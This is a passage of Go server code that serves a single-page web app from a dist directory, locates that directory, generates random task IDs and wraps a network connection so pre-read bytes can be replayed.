	// injected externally the handlers package already registered the
	// SPA route on it — registering "/" twice on the same mux panics.
	if s.apiMux != nil {
		return mux
	}
	distPath := s.findWebDist()
	if distPath != "" {
		fileServer := http.FileServer(http.Dir(distPath))
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if strings.HasPrefix(r.URL.Path, "/api/") {
				http.NotFound(w, r)
				return
			}
			path := filepath.Join(distPath, filepath.Clean(r.URL.Path))
			if _, err := os.Stat(path); err == nil {
				fileServer.ServeHTTP(w, r)
				return
			}
			http.ServeFile(w, r, filepath.Join(distPath, "index.html"))
		})
		log.Printf("[WEB] Serving SPA from %s", distPath)
	}

	return mux
}

func (s *Server) findWebDist() string {
	candidates := []string{
		"web/dist",
		"../../web/dist",
		"../../../web/dist",
	}
	for _, p := range candidates {
		if info, err := os.Stat(filepath.Join(p, "index.html")); err == nil && !info.IsDir() {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	return ""
}

func generateTaskID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("task-%x", time.Now().UnixNano())
	}
	return fmt.Sprintf("task-%x", b)
}

// peekConn wraps a net.Conn with pre-read bytes.
type peekConn struct {
	net.Conn
	peek []byte
	pos  int
}

func (c *peekConn) Read(b []byte) (int, error) {
	if c.pos < len(c.peek) {
		n := copy(b, c.peek[c.pos:])
		c.pos += n
		return n, nil
	}
	return c.Conn.Read(b)
}
